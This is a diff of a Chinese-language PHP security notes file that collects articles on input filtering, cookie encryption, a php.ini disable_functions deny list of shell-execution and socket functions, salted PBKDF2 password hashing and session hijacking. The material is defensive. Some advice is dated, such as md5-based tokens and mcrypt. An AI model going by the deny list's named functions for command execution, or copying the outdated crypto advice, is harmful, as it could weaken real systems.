 本例中首先初始化了$clean为空数组以防止包含被污染的数据。一旦证明$_POST['color']是red, green, 或blue中的一个时，就会保存到$clean['color']变量中。因此，可以确信$clean['color']变量是合法的，从而在代码的其它部分使用它。当然，你还可以在switch结构中加入一个default分支以处理非法数据的情况。一种可能是再次显示表单并提示错误。特别小心不要试图为了友好而输出被污染的数据。
 
 上面的方法对于过滤有一组已知的合法值的数据很有效，但是对于过滤有一组已知合法字符组成的数据时就没有什么帮助。例如，你可能需要一个用户名只能由字母及数字组成：
-
-
-CODE:
-
-
-1
-
-2
-
-3
-
-4
-
-5
-
-6
-
-7
-
-8
-
-9
-
-10
-
-
- 
-
- $clean = array(  );
-
- 
-
- if (ctype_alnum($_POST['username']))
-
- {
-
-   $clean['username'] = $_POST['username'];
-
- }
-
- 
-
- ?>
-
-
-
-尽管在这种情况下可以用正则表达式，但使用PHP内置函数是更完美的。这些函数包含错误的可能性要比你自已写的代码出错的可能性要低得多，而且在过滤逻辑中的一个错误几乎就意味着一个安全漏洞。
-https://www.php.cn/php-weizijiaocheng-353044.html
 ```
+ $clean = array(  );
+ if (ctype_alnum($_POST['username']))
+ {
+   $clean['username'] = $_POST['username'];
+ }
+ ?>
+```
+尽管在这种情况下可以用正则表达式，但使用PHP内置函数是更完美的。这些函数包含错误的可能性要比你自已写的代码出错的可能性要低得多，而且在过滤逻辑中的一个错误几乎就意味着一个安全漏洞。
+
+https://www.php.cn/php-weizijiaocheng-353044.html
 
 ### Cookie 安全
-```
+
 https://www.jb51.net/article/84106.htm
+
 本文实例讲述了php用户登录之cookie信息安全。分享给大家供大家参考，具体如下：
 
 大家都知道用户登陆后，用户信息一般会选择保存在cookie里面，因为cookie是保存客户端，并且cookie可以在客户端用浏览器自由更改，这样将会造成用户cookie存在伪造的危险，从而可能使伪造cookie者登录任意用户的账户。
@@ -18129,74 +18013,7 @@ https://www.jb51.net/article/84106.htm
 cookie信息加密法即用一种加密方法，加密用户信息，然后在存入cookie，这样伪造者即使得到cookie也只能在cookie有效期内对这个cookie利用，无法另外伪造cookie信息。
 
 这里附上一个加密函数：
-
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
-40
-41
-42
-43
-44
-45
-46
-47
-48
-49
-50
-51
-52
-53
-54
-55
-56
-57
-58
-59
-60
-61
-62
-63
-64
-65
-66
-67
+```
 <?php
 function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
   // 动态密匙长度，相同的明文会生成不同密文就是依靠动态密匙
@@ -18264,47 +18081,36 @@ echo "
 ";
 echo authcode($jm ,'DECODE',$key,0); //解密
 ?>
+```
 这样当设置用户信息的cookie时，就无法对其进行伪造：
-
-1
-2
-3
-4
-5
-6
+```
 <?php
 $user = array("uid"=-->$uid,"username"=>$username);
 $user = base64_encode(serialize($user));
 $user = authcode($user,'ENCODE','www.jb51.net',0); //加密
 setcookie("user",$user,time()+3600*24);
 ?>
+```
 二、用加密令牌对cookie进行保护
-
-1
-2
-3
-4
-5
+```
 $hash = md5($uid.time());//加密令牌值
 $hash_expire =time()+3600*24;//加密令牌值为一天有效期
 $user = array("uid"=>$uid,"username"=>$username,"hash"=>$hash);
 $user = base64_encode(serialize($user));
 setcookie("user",$user,$hash_expr);
+```
 然后把$hash和$hash_expire 存入member表中hash和hash_expire对应字段中,也可以存入nosql，session
 
 用户伪造cookie时，hash无法伪造,伪造的hash和数据库中的不一致
 
 用户每次登陆，这个hash_expire有效期内不更新hash值，过期则更新
-```
 
 ### 禁用 `mysql_` 系函数
-```
 https://www.jb51.net/article/89240.htm
-php禁用函数设置及查看方法详解
- 更新时间：2016年07月25日 16:04:59   转载 作者：宰相秋水  
-这篇文章主要介绍了php禁用函数设置及查看方法,结合实例形式分析了php禁用函数的方法及使用php探针查看禁用函数信息的相关实现技巧,需要的朋友可以参考下
 
- 
+php禁用函数设置及查看方法详解
+
+这篇文章主要介绍了php禁用函数设置及查看方法,结合实例形式分析了php禁用函数的方法及使用php探针查看禁用函数信息的相关实现技巧,需要的朋友可以参考下
 本文实例讲述了php禁用函数设置及查看方法。分享给大家供大家参考，具体如下：
 
 打开PHP.INI，找到这行：
@@ -18315,165 +18121,17 @@ disable_functions =
 
 给个例子：
 复制代码代码如下:
+```
 disable_functions = passthru,exec,system,popen,chroot,scandir,chgrp,chown,escapesh
 ellcmd,escapeshellarg,shell_exec,proc_open,proc_get_status
+```
 建议在主机上禁用的函数：
 复制代码代码如下:
+```
 disable_functions = system,exec,shell_exec,passthru,proc_open,proc_close, proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport, syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept, socket_connect, stream_socket_server, stream_socket_accept,stream_socket_client,ftp_connect, ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space, disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd, posix_getegid,posix_geteuid,posix_getgid, posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid, posix_getppid,posix_getpwnam,posix_getpwuid, posix_getrlimit, posix_getsid,posix_getuid,posix_isatty, posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid, posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname
-
+```
 在主机上面如何查看禁用的函数列表，我从网上找了一个非常不错的探针
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
-40
-41
-42
-43
-44
-45
-46
-47
-48
-49
-50
-51
-52
-53
-54
-55
-56
-57
-58
-59
-60
-61
-62
-63
-64
-65
-66
-67
-68
-69
-70
-71
-72
-73
-74
-75
-76
-77
-78
-79
-80
-81
-82
-83
-84
-85
-86
-87
-88
-89
-90
-91
-92
-93
-94
-95
-96
-97
-98
-99
-100
-101
-102
-103
-104
-105
-106
-107
-108
-109
-110
-111
-112
-113
-114
-115
-116
-117
-118
-119
-120
-121
-122
-123
-124
-125
-126
-127
-128
-129
-130
-131
-132
-133
-134
-135
-136
-137
-138
-139
-140
-141
-142
-143
-144
-145
-146
-147
-148
-149
-150
-151
-152
+```
 <?php
 header("content-Type: text/html; charset=utf-8");
 header("Cache-Control: no-cache, must-revalidate");
@@ -18626,34 +18284,43 @@ function phpinfoview(){
 </div>
 </body>
 </html>
-更多关于PHP相关内容感兴趣的读者可查看本站专
 ```
+更多关于PHP相关内容感兴趣的读者可查看本站专
 
 ### 数据库存储用户密码时，应该是怎么做才安全
-```
+
 https://www.cnblogs.com/milantgh/p/3612318.html
+
 如何安全的存储用户的密码
+
 大多数的web开发者都会遇到设计用户账号系统的需求。账号系统最重要的一个方面就是如何保护用户的密码。一些大公司的用户数据库泄露事件也时有发生，所以我们必须采取一些措施来保护用户的密码，即使网站被攻破的情况下也不会造成较大的危害。如果你还在存储用户密码的MD5,那可真的有点弱了。赶紧来看看这篇文章吧。
 
 保护密码最好的的方式就是使用带盐的密码hash(salted password hashing).对密码进行hash操作是一件很简单的事情，但是很多人都犯了错。接下来我希望可以详细的阐述如何恰当的对密码进行hash，以及为什么要这样做。
 
 重要提醒
+
 如果你打算自己写一段代码来进行密码hash，那么赶紧停下吧。这样太容易犯错了。这个提醒适用于每一个人，不要自己写密码的hash算法 ！关于保存密码的问题已经有了成熟的方案，那就是使用phpass或者本文提供的源码。
 
 什么是hash
-
+```
 hash("hello") = 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824
 hash("hbllo") = 58756879c05c68dfac9866712fad6a93f8146f337a69afe7dd238f3364946366
 hash("waltz") = c0e81794384491161f1777c232bc6bd9ec38f616560b120fda8e90f383853542
+```
 Hash算法是一种单向的函数。它可以把任意数量的数据转换成固定长度的“指纹”，这个过程是不可逆的。而且只要输入发生改变，哪怕只有一个bit，输出的hash值也会有很大不同。这种特性恰好合适用来用来保存密码。因为我们希望使用一种不可逆的算法来加密保存的密码，同时又需要在用户登陆的时候验证密码是否正确。
 
 在一个使用hash的账号系统中，用户注册和认证的大致流程如下：
 
 1, 用户创建自己的账号 
+
 2, 用户密码经过hash操作之后存储在数据库中。没有任何明文的密码存储在服务器的硬盘上。 
+
 3, 用户登陆的时候，将用户输入的密码进行hash操作后与数据库里保存的密码hash值进行对比。 
+
 4, 如果hash值完全一样，则认为用户输入的密码是正确的。否则就认为用户输入了无效的密码。 
+
 5, 每次用户尝试登陆的时候就重复步骤3和步骤4。
+
 在步骤4的时候不要告诉用户是账号还是密码错了。只需要显示一个通用的提示，比如账号或密码不正确就可以了。这样可以防止攻击者枚举有效的用户名。
 
 还需要注意的是用来保护密码的hash函数跟数据结构课上见过的hash函数不完全一样。比如实现hash表的hash函数设计的目的是快速，但是不够安全。只有加密hash函数(cryptographic hash functions)可以用来进行密码的hash。这样的函数有SHA256, SHA512, RipeMD, WHIRLPOOL等。
@@ -18661,36 +18328,39 @@ Hash算法是一种单向的函数。它可以把任意数量的数据转换成�
 一个常见的观念就是密码经过hash之后存储就安全了。这显然是不正确的。有很多方式可以快速的从hash恢复明文的密码。还记得那些md5破解网站吧，只需要提交一个hash，不到一秒钟就能知道结果。显然，单纯的对密码进行hash还是远远达不到我们的安全需求。下一部分先讨论一下破解密码hash，获取明文常见的手段。
 
 如何破解hash
+
 字典和暴力破解攻击(Dictionary and Brute Force Attacks)
+
 最常见的破解hash手段就是猜测密码。然后对每一个可能的密码进行hash，对比需要破解的hash和猜测的密码hash值，如果两个值一样，那么之前猜测的密码就是正确的密码明文。猜测密码攻击常用的方式就是字典攻击和暴力攻击。
-
+```
 Dictionary Attack
-
 Trying apple        : failed
 Trying blueberry    : failed
 Trying justinbeiber : failed
 ...
 Trying letmein      : failed
 Trying s3cr3t       : success!
+```
 字典攻击是将常用的密码，单词，短语和其他可能用来做密码的字符串放到一个文件中，然后对文件中的每一个词进行hash，将这些hash与需要破解的密码hash比较。这种方式的成功率取决于密码字典的大小以及字典的是否合适。
-
+```
 Brute Force Attack
-
 Trying aaaa : failed
 Trying aaab : failed
 Trying aaac : failed
 ...
 Trying acdb : failed
 Trying acdc : success!
+```
 暴力攻击就是对于给定的密码长度，尝试每一种可能的字符组合。这种方式需要花费大量的计算机时间。但是理论上只要时间足够，最后密码一定能够破解出来。只是如果密码太长，破解花费的时间就会大到无法承受。
 
 目前没有方式可以阻止字典攻击和暴力攻击。只能想办法让它们变的低效。如果你的密码hash系统设计的是安全的，那么破解hash唯一的方式就是进行字典或者暴力攻击了。
 
 查表破解(Lookup Tables)
+
 对于特定的hash类型，如果需要破解大量hash的话，查表是一种非常有效而且快速的方式。它的理念就是预先计算(pre-compute)出密码字典中每一个密码的hash。然后把hash和对应的密码保存在一个表里。一个设计良好的查询表结构，即使存储了数十亿个hash，每秒钟仍然可以查询成百上千个hash。
 
 如果你想感受下查表破解hash的话可以尝试一下在CraskStation上破解下下面的sha256 hash。
-
+```
 c11083b4b0a7743af748c85d343dfee9fbb8b2576c05f3a7f0d632b0926aadfc
 08eac03b80adc33dc7d8fbe44b7c7b05d3a2c511166bdb43fcb710b03ba919e7
 e4ba5cbd251c98e6cd1c23f126a3b81d8d8328abc95387229850952b3ef9f904
@@ -18701,20 +18371,23 @@ Searching for hash(blueberry) in users' hash list... : Matches [usr10101, timmy,
 Searching for hash(letmein) in users' hash list...   : Matches [wilson10, dragonslayerX, joe1984]
 Searching for hash(s3cr3t) in users' hash list...    : Matches [bruce19, knuth1337, john87]
 Searching for hash(z@29hjja) in users' hash list...  : No users used this password
+```
 这种方式可以让攻击者不预先计算一个查询表的情况下同时对大量hash进行字典和暴力破解攻击。
 
 首先，攻击者会根据获取到的数据库数据制作一个用户名和对应的hash表。然后将常见的字典密码进行hash之后，跟这个表的hash进行对比，就可以知道用哪些用户使用了这个密码。这种攻击方式很有效果，因为通常情况下很多用户都会有使用相同的密码。
 
 彩虹表 (Rainbow Tables)
+
 彩虹表是一种使用空间换取时间的技术。跟查表破解很相似。只是它牺牲了一些破解时间来达到更小的存储空间的目的。因为彩虹表使用的存储空间更小，所以单位空间就可以存储更多的hash。彩虹表已经能够破解8位长度的任意md5hash。彩虹表具体的原理可以参考http://www.project-rainbowcrack.com/
 
 下一章节我们会讨论一种叫做“盐”(salting)的技术。通过这种技术可以让查表和彩虹表的方式无法破解hash。
-
+```
 加盐(Adding Salt)
 hash("hello")                    = 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824
 hash("hello" + "QxLUF1bgIAdeQX") = 9e209040c863f84a31e719795b2577523954739fe5ed3b58a75cff2127075ed1
 hash("hello" + "bv5PehSMfV11Cd") = d1d3ec2e6f20fd420d50e2642992841d8338a314b8ea157c9e18477aaef226ab
 hash("hello" + "YYLmfY6IehjZMQ") = a49670c3c18b9e079b9cfaf51634f563dc8ae3070db2c4a8544305df1b60f007
+```
 查表和彩虹表的方式之所以有效是因为每一个密码的都是通过同样的方式来进行hash的。如果两个用户使用了同样的密码，那么一定他们的密码hash也一定相同。我们可以通过让每一个hash随机化，同一个密码hash两次，得到的不同的hash来避免这种攻击。
 
 具体的操作就是给密码加一个随即的前缀或者后缀，然后再进行hash。这个随即的后缀或者前缀成为“盐”。正如上面给出的例子一样，通过加盐，相同的密码每次hash都是完全不一样的字符串了。检查用户输入的密码是否正确的时候，我们也还需要这个盐，所以盐一般都是跟hash一起保存在数据库里，或者作为hash字符串的一部分。
@@ -18724,14 +18397,17 @@ hash("hello" + "YYLmfY6IehjZMQ") = a49670c3c18b9e079b9cfaf51634f563dc8ae3070db2c
 下一节，我们会介绍一些盐的常见的错误实现。
 
 错误的方式：短的盐和盐的复用
+
 最常见的错误实现就是一个盐在多个hash中使用或者使用的盐很短。
 
 盐的复用(Salt Reuse)
+
 不管是将盐硬编码在程序里还是随机一次生成的，在每一个密码hash里使用相同的盐会使这种防御方法失效。因为相同的密码hash两次得到的结果还是相同的。攻击者就可以使用反向查表的方式进行字典和暴力攻击。只要在对字典中每一个密码进行hash之前加上这个固定的盐就可以了。如果是流行的程序的使用了硬编码的盐，那么也可能出现针对这种程序的这个盐的查询表和彩虹表，从而实现快速破解hash。
 
 用户每次创建或者修改密码一定要使用一个新的随机的盐
 
 短的盐
+
 如果盐的位数太短的话，攻击者也可以预先制作针对所有可能的盐的查询表。比如，3位ASCII字符的盐，一共有95x95x95 = 857,375种可能性。看起来好像很多。假如每一个盐制作一个1MB的包含常见密码的查询表，857,375个盐才是837GB。现在买个1TB的硬盘都只要几百块而已。
 
 基于同样的理由，千万不要用用户名做为盐。虽然对于每一个用户来说用户名可能是不同的，但是用户名是可预测的，并不是完全随机的。攻击者完全可以用常见的用户名作为盐来制作查询表和彩虹表破解hash。
@@ -18739,15 +18415,17 @@ hash("hello" + "YYLmfY6IehjZMQ") = a49670c3c18b9e079b9cfaf51634f563dc8ae3070db2c
 根据一些经验得出来的规则就是盐的大小要跟hash函数的输出一致。比如，SHA256的输出是256bits(32bytes),盐的长度也应该是32个字节的随机数据。
 
 错误的方式：双重hash和古怪的hash函数
+
 这一节讨论另外一个常见的hash密码的误解:古怪的hash算法组合。人们可能解决的将不同的hash函数组合在一起用可以让数据更安全。但实际上，这种方式带来的效果很微小。反而可能带来一些互通性的问题，甚至有时候会让hash更加的不安全。本文一开始就提到过，永远不要尝试自己写hash算法，要使用专家们设计的标准算法。有些人会觉得通过使用多个hash函数可以降低计算hash的速度，从而增加破解的难度。通过减慢hash计算速度来防御攻击有更好的方法，这个下文会详细介绍。
 
 下面是一些网上找到的古怪的hash函数组合的样例。
-
+```
 md5(sha1(password))
 md5(md5(salt) + md5(password))
 sha1(sha1(password))
 sha1(str_rot13(password + salt))
 md5(sha1(md5(md5(password) + sha1(password)) + md5(password)))
+```
 不要使用他们！
 
 注意：这部分的内容其实是存在争议的！我收到过大量邮件说组合hash函数是有意义的。因为如果攻击者不知道我们用了哪个函数，就不可能事先计算出彩虹表，并且组合hash函数需要更多的计算时间。
@@ -18757,18 +18435,21 @@ md5(sha1(md5(md5(password) + sha1(password)) + md5(password)))
 如果你想使用一个标准的”古怪”的hash函数，比如HMAC，是可以的。但是如果你的目的是想减慢hash的计算速度，那么可以读一下后面讨论的慢速hash函数部分。基于上面讨论的因素，最好的做法是使用标准的经过严格测试的hash算法。
 
 hash碰撞(Hash Collisions)
+
 因为hash函数是将任意数量的数据映射成一个固定长度的字符串，所以一定存在不同的输入经过hash之后变成相同的字符串的情况。加密hash函数(Cryptographic hash function)在设计的时候希望使这种碰撞攻击实现起来成本难以置信的高。但时不时的就有密码学家发现快速实现hash碰撞的方法。最近的一个例子就是MD5，它的碰撞攻击已经实现了。
 
 碰撞攻击是找到另外一个跟原密码不一样，但是具有相同hash的字符串。但是，即使在相对弱的hash算法，比如MD5,要实现碰撞攻击也需要大量的算力(computing power),所以在实际使用中偶然出现hash碰撞的情况几乎不太可能。一个使用加盐MD5的密码hash在实际使用中跟使用其他算法比如SHA256一样安全。不过如果可以的话，使用更安全的hash函数，比如SHA256, SHA512, RipeMD, WHIRLPOOL等是更好的选择。
 
 正确的方式：如何恰当的进行hash
+
 这部分会详细讨论如何恰当的进行密码hash。第一个章节是最基础的，这章节的内容是必须的。后面一个章节是阐述如何继续增强安全性，让hash破解变得异常困难。
 
 基础：使用加盐hash
+
 我们已经知道恶意黑客可以通过查表和彩虹表的方式快速的获得hash对应的明文密码，我们也知道了通过使用随机的盐可以解决这个问题。但是我们怎么生成盐，怎么在hash的过程中使用盐呢？
 
 盐要使用密码学上可靠安全的伪随机数生成器(Cryptographically Secure Pseudo-Random Number Generator (CSPRNG))来产生。CSPRNG跟普通的伪随机数生成器比如C语言中的rand(),有很大不同。正如它的名字说明的那样，CSPRNG提供一个高标准的随机数，是完全无法预测的。我们不希望我们的盐能够被预测到，所以一定要使用CSPRNG。下表提供了一些常用语言中的CSPRNG。
-
+```
 Platform	CSPRNG
 PHP	mcrypt_create_iv, openssl_random_pseudo_bytes
 Java	java.security.SecureRandom
@@ -18778,6 +18459,7 @@ Python	os.urandom
 Perl	Math::Random::Secure
 C/C++ (Windows API)	CryptGenRandom
 Any language on GNU/Linux or Unix	Read from /dev/random or /dev/urandom
+```
 每一个用户，每一个密码都要使用不同的盐。用户每次创建账户或者修改密码都要使用一个新的随机盐。永远不要重复使用盐。盐的长度要足够，一个经验规则就是盐的至少要跟hash函数输出的长度一致。盐应该跟hash一起存储在用户信息表里。
 
 存储一个密码：
@@ -18841,6 +18523,7 @@ key扩展的实现是使用一种大量消耗cpu资源的hash函数。不要去�
 需要注意使用key的hash并不是不需要加盐，聪明的攻击者总是会找到办法获取到key的。所以让hash在盐和key扩展的保护下非常重要。
 
 其他的安全措施
+
 密码hash仅仅是在发生安全事故的时候保护密码。它并不能让应用程序更加安全。对于保护用户密码hash更多的是需要保护密码hash不被偷走。
 
 即使经验丰富的程序也需要经过安全培训才能写出安全的应用。一个不错的学习web应用漏洞的资源是OWASP。除非你理解了OWASP Top Ten Vulnerability List,否则不要去写关系到敏感数据的程序。公司有责任确保所有的开发者都经过了足够的安全开发的培训。
@@ -18850,6 +18533,7 @@ key扩展的实现是使用一种大量消耗cpu资源的hash函数。不要去�
 对网站进行入侵监控也十分重要。我建议至少招聘一名全职的安全人员进行入侵检测和安全事件响应。如果入侵没有检测到，攻击者可能让在你的网站上挂马影响你的用户。所以迅速的入侵检测和响应也很重要。
 
 经常提问的问题
+
 我应该使用什么hash算法
 
 可以使用
@@ -18937,20 +18621,21 @@ hash函数，比如MD5,SHA1,SHA2使用了Merkle–Damgård construction，这导
 本文提供的代码中 slowequals 函数是怎么工作的
 
 上一回答讲到了我们需要比较时间固定的函数，这部分详细讲一下代码的实现。
-
-1.     private static boolean slowEquals(byte[] a, byte[] b)
-2.     {
-3.         int diff = a.length ^ b.length;
-4.         for(int i = 0; i < a.length && i < b.length; i++)
-5.             diff |= a[i] ^ b[i];
-6.         return diff == 0;
-7.     }
+```
+private static boolean slowEquals(byte[] a, byte[] b)
+{
+int diff = a.length ^ b.length;
+for(int i = 0; i < a.length && i < b.length; i++)
+diff |= a[i] ^ b[i];
+return diff == 0;
+}
+```
 这段代码使用了异或(XOR)操作符”^”来比较整数是否相等，而没有使用”==”操作符。原因在于如果两个数完全一致，异或之后的值为零。因为 0 XOR 0 = 0, 1 XOR 1 = 0, 0 XOR 1 = 1, 1 XOR 0 = 1。
 
 所以，第一行代码如果a.length等于b.length，变量diff等于0,否则的话diff就是一个非零的值。然后，让a，b的每一个字节XOR之后再跟diff OR。这样，只有diff一开始是0,并且，a，b的每一个字节XOR的结果也是零，最后循环完成后diff的值才是0,这种情况是a，b完全一样。否则最后diff是一个非零的值。
 
 我们使用XOR而不适用”==”的原因是”==”通常编译成分支的形式。比如C代码”diff &= a == b” 可能编译成下面的X86汇编。
-
+```
 MOV EAX, [A]
 CMP [B], EAX
 JZ equal
@@ -18962,10 +18647,10 @@ AND [VALID], 0
 分支会导致代码执行的时间出现差异。
 
 C代码的”diff |= a ^ b”编译之后类似于，
-
 MOV EAX, [A]
 XOR EAX, [B]
 OR [DIFF], EAX
+```
 执行时间跟两个变量是否相等没有关系。
 
 为什么要讨论这么多关于hash的东西
@@ -18973,8 +18658,7 @@ OR [DIFF], EAX
 用户在你的网站上输入密码，是相信你的安全性。如果你的数据库被黑了。而用户密码又没有恰当的保护，那么恶意的攻击者就可以利用这些密码尝试登陆其他的网站和服务。进行撞库攻击。(很多用户在所有的地方都是使用相同的密码)这不仅仅是你的网站安全，是你的所有用户的安全。你要对你用户的安全负责。
 
 PHP PBKDF2 密码hash代码
-代码下载
-
+```
 <?php
 /*
  * Password Hashing With PBKDF2 (http://crackstation.net/hashing-security.htm).
@@ -19088,9 +18772,9 @@ define("HASH_PBKDF2_INDEX", 3);function create_hash($password){
         return substr($output, 0, $key_length);
     else
         return bin2hex(substr($output, 0, $key_length));}?>
+```
 java PBKDF2 密码hash代码
-代码下载
-
+```
 /* 
  * Password Hashing With PBKDF2 (http://crackstation.net/hashing-security.htm).
  * Copyright (c) 2013, Taylor Hornby
@@ -19326,9 +19010,10 @@ public class PasswordHash
     }
 
 }
+```
 ASP.NET (C#)密码hash代码
-代码下载
 
+```
 /* 
  * Password Hashing With PBKDF2 (http://crackstation.net/hashing-security.htm).
  * Copyright (c) 2013, Taylor Hornby
@@ -19450,126 +19135,9 @@ namespace PasswordHash
         }
     }
 }
+```
 Ruby (on Rails) 密码hash代码
-代码下载
-
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
-40
-41
-42
-43
-44
-45
-46
-47
-48
-49
-50
-51
-52
-53
-54
-55
-56
-57
-58
-59
-60
-61
-62
-63
-64
-65
-66
-67
-68
-69
-70
-71
-72
-73
-74
-75
-76
-77
-78
-79
-80
-81
-82
-83
-84
-85
-86
-87
-88
-89
-90
-91
-92
-93
-94
-95
-96
-97
-98
-99
-100
-101
-102
-103
-104
-105
-106
-107
-108
-109
-110
-111
-112
-113
-114
-115
-116
-117
+```
 # Password Hashing With PBKDF2 (http://crackstation.net/hashing-security.htm).
 # Copyright (c) 2013, Taylor Hornby
 # All rights reserved.
@@ -19683,16 +19251,13 @@ module PasswordHash
       @@allPass = false
     end
   end
- 
 end
- 
 PasswordHash.runSelfTests
 ```
 
 ### 验证码 Session 问题
-```
 php验证码类 session问题
-原创2016-06-23 14:23:240163
+
 widht = $widht; $this->height = $height; $this->codenum = $codenum; } function showcode() { $this->createcode();//创建画布 $this->createstring();//创建字符串 $this->createimage();//生成图像 } private function createcode()//创建画布 { $this->image = imagecreate($this->widht,$this->height); $backcolor = imagecolorallocate($this->image,255,255,255);//如需改变背景色请设置这里的RGB imagefill($this->image,0,0,$backcolor); if($this->bg == true) { $bg = imagecolorallocate($this->image,221,221,221); for($i = 0; $i < $this->widht / 2;$i++)//画竖线底纹 { imageline($this->image,$i*2,0,$i*2,$this->height,$bg); } for($i = 0;$i < $this->height / 3;$i++)//画横向底纹 { imageline($this->image,0,$i*3,$this->widht,$i*3,$bg); } } } private function createstring()//在画布写入字符串 { $string = $this->codestring(); session_start(); $_SESSION["vericode"] = $string; for($i = 0;$i < $this->codenum;$i++) { if($this->randttf == true) { $ttf = 'ttfs/t'.rand(1,9).'.ttf';//随机字体 请保证 ttfs文件夹 在同一目录里中，如改变路径请改变此路径 }else { $ttf = 'ttfs/t1.ttf';//9中字体请自己常识，只需要修改t4中数字 1 - 9看看到每种字体的效果，选择自己喜欢的 注：请关掉随机字体测试 } $fontsize = rand(14,15);//产生随机字体大小 $fontangle = rand(-10,10);//字符倾斜角度 随即倾斜 $x = $i*12+4; $y =rand($fontsize,$this->height-8); if($this->randcolor == true) { $textcolor = imagecolorallocate($this->image,rand(0,180),rand(0,180),rand(0,180)); }else { $textcolor = imagecolorallocate($this->image,0,0,0); } imagettftext($this->image,$fontsize,$fontangle,$x,$y,$textcolor,$ttf,$string[$i]); } } private function codestring()//生成随机字符串 { $string = ''; for($i=0;$i < $this->codenum;$i++) { $num = rand(1,1); /* * 如果想是单一的格式,请参考： * * 只要需要数字 * * 把上边的 $num = rand(1,3) 改成 $num = rand(2,2) * * 只需要小写字母 * * 把上边的 $num = rand(1,3) 改成 $num = rand(3,3) * * 只需要大写字母 * * 把上边的 $num = rand(1,3) 改成 $num = rand(1,1) * * 只需要 小写字母 和 数字 * * 把上边的 $num = rand(1,3) 改成 $num = rand(3,2) * */ switch($num) { case 1: $num2 = rand(65,90); //随机产生小写字母 a - z 所对应的ASCII码的值 break; case 2: $num2 = rand(51,57); //随机产生数字 2 9 所对应的ASCII码的值 如果是rand(48,57):0-9将有0 这样不利于用户判断 break; case 3: $num2 = rand(97,122); //随机产生大写字母 A - Z 所对应的ASCII码的值 break; } /* *为用用户着想去除了 0 o I i 1 z Z 2 * */ if($num2 == 111 || $num == 105 || $num == 122 || $num2 == 79 || $num2 == 73 || $num == 90)//如果是大写字母中的O,I用P代替 { $num2 = 112; } $tmp = sprintf("%c",$num2); //用sprintf函数来得到产生ASCII码所对应的字符 $string .=$tmp; } return $string; } private function createimage()//生成图像 { if(function_exists("imagegif")) { header("Content-type:image/gif"); imagegif($this->image); }elseif(function_exists("imagejpeg")) { header("Content-type:image/jpeg"); imagejpeg($this->image,"",50);//50为图像的品质，0-100 0质量最差，图像文件越小 100质量最好，图像文件越大 }elseif(function_exists("imagepng")) { header("Content-type:image/png"); imagepng($this->image); }elseif(function_exists("imagewbmp")) { header("Content-type:image/vnd.wap.wbmp"); imagewbmp($this->image); }else { die('服务器不支持图像，请检查GD库'); } } function __destruct() { imagedestroy($this->image); } }?>
 
 上边的是验证码类
@@ -19703,7 +19268,6 @@ showcode(); if(strtoupper($_GET["code"]) != $_SESSION["vericode"] ) { echo '验�
 
 我在类中已经讲 验证码字符串赋值给了 $_SESSION['vericode'] 但是我在页面测试的时候获取不到 打印session数组也无结果 求解
 
-回复讨论(解决方案)
 太长了, 没看.
 
 请问, 表单页面和验证码页面是否处于不同二级域名下?
@@ -19711,7 +19275,6 @@ showcode(); if(strtoupper($_GET["code"]) != $_SESSION["vericode"] ) { echo '验�
 你下面那段测试代码的逻辑有问题
 
 PHP code
-
 
 /*
 *类名：验证码类
@@ -19741,31 +19304,38 @@ php简单验证码类（字母+数字）
 http://3aj.cn/php/27.html
 
 https://www.php.cn/php-weizijiaocheng-264588.html
-```
 
 ### 安全的 Session ID （让即使拦截后，也无法模拟使用）
-```
 https://zhuanlan.zhihu.com/p/95276068
+
 一、概述
+
 对于Web应用程序来说，加强安全性的第一条原则就是——不要信任来自客户端的数据，一定要进行数据验证以及过滤才能在程序中使用，进而保存到数据层。然而，由于Http的无状态性，为了维持来自同一个用户的不同请求之间的状态，客户端必须发送一个唯一的身份标识符（Session ID）来表明自己的身份。很显然，这与前面提到的安全原则是相违背的，但是没有办法，为了维持状态，我们别无选择，这也导致了Session在web应用程序中是十分脆弱的一个环节。
 
 由于PHP内置的Session管理机制并没有提供安全处理，所以，开发人员需要建立相应的安全机制来防范会话攻击。针对Session的攻击手段主要有会话劫持（Session hijacking）和会话固定（Session fixation）两种。
 
-
-
 二、会话劫持（Session hijacking）
+
 会话劫持（Session hijacking），这是一种通过获取用户Session ID后，使用该Session ID登录目标账号的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。会话劫持的第一步是取得一个合法的会话标识来伪装成合法用户，因此需要保证会话标识不被泄漏。
 
 攻击步骤：
+
 目标用户需要先登录站点；
+
 登录成功后，该用户会得到站点提供的一个会话标识SessionID；
+
 攻击者通过某种攻击手段捕获Session ID；
+
 攻击者通过捕获到的Session ID访问站点即可获得目标用户合法会话。
 
 攻击者获取SessionID的方式有多种：
+
 暴力破解：尝试各种Session ID，直到破解为止；
+
 预测：如果Session ID使用非随机的方式产生，那么就有可能计算出来；
+
 窃取：使用网络嗅探，XSS攻击等方法获得。
+
 PHP内部Session的实现机制虽然不是很安全，但是关于生成SessionID的环节还是比较安全的，这个随机的SessionID往往是极其复杂的并且难于被预测出来，所以，对于第一、第二种攻击方式基本上是不太可能成功的。
 
 在第三种攻击方式中，针对网络嗅探攻击，是通过捕获网络通信数据得到SessionID的，这种攻击可以通过SSL避免。本文主要分析的是应用层面的攻击方式及其防御方法。
